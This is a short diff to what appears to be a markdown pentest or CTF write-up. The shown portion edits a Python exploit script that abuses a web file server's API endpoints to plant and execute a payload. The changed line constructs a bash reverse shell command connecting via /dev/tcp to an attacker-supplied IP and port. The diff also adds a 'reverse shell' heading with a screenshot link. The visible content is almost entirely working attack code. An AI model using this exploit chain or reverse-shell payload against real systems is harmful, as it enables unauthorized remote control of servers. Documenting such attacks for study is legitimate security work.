@@ -373,7 +373,7 @@ step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","prop
 
 print("Step 3 create folder")
 
-command = "bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1'".format(ip,port)
+command = "bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'".format(ip,port)
 
 command = command.encode('utf-8')
 
@@ -388,3 +388,6 @@ print("Step 4 execute payload")
 step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
 
+### reverse shell
+
+![[Pasted image 20240823162146.png]]
